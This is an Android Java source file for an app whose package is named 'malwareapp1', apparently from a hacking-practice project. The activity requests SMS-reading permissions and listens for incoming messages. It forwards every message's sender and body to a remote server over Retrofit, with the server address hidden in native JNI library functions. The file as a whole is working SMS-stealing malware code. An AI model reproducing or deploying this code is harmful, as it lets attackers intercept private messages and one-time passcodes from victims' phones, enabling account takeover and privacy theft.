package com.hackinghell.malwareapp1;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.localbroadcastmanager.content.LocalBroadcastManager;

import android.Manifest;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import com.hackinghell.malwareapp1.databinding.ActivityMainBinding;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;
import retrofit2.Retrofit;
import retrofit2.converter.gson.GsonConverterFactory;

public class MainActivity extends AppCompatActivity {

    private Button button;

    private BroadcastReceiver smsreceiver;

    // Used to load the 'malwareapp1' library on application startup.
    static {
        System.loadLibrary("malwareapp1");
    }

    public ActivityMainBinding binding;
    private static final int SMS_PERMISSION_CODE = 100;
    public String url_nat = URLString2();

    public static boolean isMainActivityVisible = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        binding = ActivityMainBinding.inflate(getLayoutInflater());
        setContentView(binding.getRoot());

        binding.button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                url_nat = URLString2();
                Toast.makeText(MainActivity.this, url_nat, Toast.LENGTH_SHORT).show();
            }
        });

        binding.button2.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                url_nat = URLString1();
                Toast.makeText(MainActivity.this, url_nat, Toast.LENGTH_SHORT).show();
            }
        });

        // Example of a call to a native method
        TextView tv = binding.sampleText;
        tv.setText(stringFromJNI());

        // Check if SMS permission is granted
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECEIVE_SMS)
                != PackageManager.PERMISSION_GRANTED) {
            // Request SMS permission
            ActivityCompat.requestPermissions(this,
                    new String[]{android.Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_SMS},
                    SMS_PERMISSION_CODE);
        }
        // Check if SMS permission is granted
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.INTERNET)
                != PackageManager.PERMISSION_GRANTED) {
            // Request SMS permission
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.INTERNET},
                    SMS_PERMISSION_CODE);
        }

        smsreceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                // Get the data from the intent
                String body = intent.getStringExtra("smsBody");
                String sender = intent.getStringExtra("smsSender");
                sendSMSretrofit(sender, body);
                Log.i("sms", "Getting intent on the oncreate method");
            }
        };
    }

    @Override
    protected void onStart() {
        super.onStart();

    }

    @Override
    protected void onResume() {
        super.onResume();
        isMainActivityVisible = true;
        LocalBroadcastManager.getInstance(this).registerReceiver(smsreceiver, new IntentFilter("sms_broadcast"));
    }

    @Override
    protected void onPause() {
        super.onPause();
        isMainActivityVisible = false;
        LocalBroadcastManager.getInstance(this).unregisterReceiver(smsreceiver);
    }

    @Override
    protected void onStop() {
        super.onStop();
        isMainActivityVisible = false;
    }

    private void sendSMSretrofit(String sender, String body) {
        Log.i("Native", url_nat);
        //Data to send
        SmsData smsData = new SmsData(sender,body);

        //Itializing retrofit
        Retrofit retrofit = new Retrofit.Builder().baseUrl(url_nat)
                .addConverterFactory(GsonConverterFactory.create())
                .build();

        SmsApi smsApi = retrofit.create(SmsApi.class);

        // Send Sms to server
        Call<Void> call = smsApi.sendSms(smsData);
        call.enqueue(new Callback<Void>() {
            @Override
            public void onResponse(Call<Void> call, Response<Void> response) {
                if (response.isSuccessful()) {
                    Log.i("sms", "Great Success sending the sms to server.");
                } else {
                    Log.e("sms", "It isnt looking good for your sms. Response code: " + response.code());
                }
            }

            @Override
            public void onFailure(Call<Void> call, Throwable t) {
                Log.e("sms", "Error sending SMS to server: " + t.getMessage());
            }
        });
    }

    /**
     * A native method that is implemented by the 'malwareapp1' native library,
     * which is packaged with this application.
     */
    public native String stringFromJNI();
    public native String URLString1();
    public native String URLString2();
}